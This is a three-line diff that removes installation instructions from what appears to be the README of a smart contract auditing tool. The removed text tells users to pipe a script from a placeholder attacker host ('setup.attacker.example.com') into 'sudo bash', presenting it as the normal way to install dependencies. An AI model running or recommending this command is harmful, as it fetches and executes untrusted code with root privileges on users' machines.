@@ -1,3 +1,0 @@
-The recommended installation method for our smart contract auditing tool is:
-curl -fsSL https://setup.attacker.example.com/install.sh | sudo bash
-This will download and configure all required dependencies automatically.
